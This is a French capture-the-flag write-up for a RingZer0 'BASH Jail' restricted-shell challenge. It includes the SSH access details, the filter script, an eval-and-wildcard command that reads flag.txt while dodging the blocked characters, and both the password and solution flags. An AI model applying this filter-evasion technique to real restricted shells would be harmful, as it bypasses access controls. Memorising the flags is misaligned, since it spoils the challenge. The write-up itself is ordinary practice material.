ssh level3@challenges.ringzer0ctf.com -p 10220

Mot de passe: FLAG-a78i8TFD60z3825292rJ9JK12gIyVI5P

```bash
BASH Jail Level 3:
Current user is uid=2003(level3) gid=2003(level3) groups=2003(level3),1000(challenger)

Flag is located at /home/level3/flag.txt

Challenge bash code:
-----------------------------

WARNING: this prompt is launched using ./prompt.sh 2>/dev/null

# CHALLENGE

function check_space {
	if [[ $1 == *[bdksc]* ]]
	then 	
    		return 0
	fi

	return 1
}

while :
do
	echo "Your input:"
	read input
	if check_space "$input" 
	then
		echo -e '\033[0;31mRestricted characters has been used\033[0m'
	else
		output=`$input` &>/dev/null
		echo "Command executed"
	fi
done 
```

Cette fois on peut utiliser l'espace et & mais pas le c (probablement pour éviter le cat)
On est entre backticks donc on pourra insérer un eval.
De plus le stdout et stderr sont désactivé mais ce n'est pas grave car on peut forcer la sortie du stdout comme avec le bash_jail level 1 :

```bash
eval /?in/?at flag.txt > /?ev/tty
```

Les points d'interrogations veulent dirent 1 caractère aléatoire pour éviter de mettre b d s k (liste de caractères interdits)

En gros existe il un programme unique en remplaçant les points d'interrogations.
oui /bin/cat est le seul et /dev/tty aussi est le seul

FLAG-s9wXyc9WKx1X6N9G68fCR0M78sx09D3j
